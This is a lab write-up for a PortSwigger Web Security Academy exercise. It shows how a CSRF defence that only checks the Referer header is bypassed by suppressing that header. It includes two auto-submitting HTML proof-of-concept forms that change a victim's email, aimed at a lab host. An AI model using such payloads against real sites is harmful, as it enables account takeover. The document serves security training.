## Lab Description: 

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/92feecab-6680-4a66-baab-851fbef45c35)

## Solution:

Open Burp's browser and log in to your account. Submit the "Update email" form, and find the resulting request in your Proxy history.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/f940f2cb-9c60-4f85-883a-9f0a255d61e2)

Send the request to Burp Repeater and Generte the payload.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/f7a10623-f331-4ed5-9522-9606c55cb901)

Created POC is below
```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a18004d04877b8f83715009002f001c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test123&#64;gmial&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```

when viewing the exploit it will show as invalid Referer header.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/971f1b69-3d4b-4708-8d7c-885b6912c2fa)

Then Delete the Referer header entirely and observe that the request is now accepted.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/49a70a29-dd51-4c26-9330-e20c85f82a9e)

request worked.

Create and host a proof of concept exploit as described in the solution to the CSRF vulnerability with no defenses lab. Include the following HTML to suppress the Referer header:

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/b25b84d3-abe3-427e-b85a-ec096c3a6724)

```
<meta name="referrer" content="no-referrer">
```
now Generte the payload an insert this payload in that.

```
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
   <meta name="referrer" content="no-referrer">
    <form action="https://0a18004d04877b8f83715009002f001c.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="test123&#64;gmial&#46;com" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>
```
Store the exploit, then click "Deliver to victim" to solve the lab.

![image](https://github.com/jayshah17/PortSwiggerLabs/assets/76842630/e8e91350-92b9-445a-92b7-dce89e371d01)
